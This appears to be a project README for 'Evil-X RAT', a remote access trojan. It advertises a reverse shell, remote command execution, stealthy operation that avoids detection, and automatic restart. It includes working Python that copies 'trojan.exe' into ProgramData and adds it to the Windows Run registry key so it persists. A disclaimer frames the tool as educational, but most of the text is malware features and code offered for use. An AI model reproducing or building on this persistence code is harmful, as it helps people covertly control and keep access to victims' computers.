# Evil-X RAT

**Evil-X RAT** is a malicious remote administration tool designed for educational and research purposes in the field of cybersecurity. This tool creates a reverse shell on a targeted device, enabling remote access and control.

## Features

- **Bidirectional Communication**: Facilitates seamless communication between the attacker's server and the victim's device.
- **Remote Command Execution**: Allows the execution of pre-defined and custom commands on the victim's machine.
- **Stealth Operation**: Operates quietly to avoid detection while maintaining functionality.
- **Auto-Restart Mechanism**: Ensures the malware restarts automatically if the process is terminated.

> **Disclaimer**: This tool is intended for ethical hacking and educational use only. Unauthorized access to systems is illegal and punishable by law. Always obtain explicit permission before testing any systems.

## Code Example

Here’s a basic implementation of an auto-restart mechanism for the malware.

```python
import subprocess
import os
import getpass
import shutil
import winreg
import sys

MAIN_MALWARE_DIST = "C:\ProgramData"
SUB_MALWARE_DIST = os.path.join(MAIN_MALWARE_DIST, "n3wrattool")

if os.path.exists(SUB_MALWARE_DIST):
    sys.exit()

os.mkdir(SUB_MALWARE_DIST)

EXE_NAME = "trojan.exe"
REG_EXE_ADDRESS = os.path.join(SUB_MALWARE_DIST, EXE_NAME)
shutil.move("trojan.exe", SUB_MALWARE_DIST)

key = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    "Software\Microsoft\Windows\CurrentVersion\Run",
    0,
    winreg.KEY_ALL_ACCESS,
)
winreg.SetValueEx(key, "Evil-X Rat", 0, winreg.REG_SZ, REG_EXE_ADDRESS)
key.Close()

```
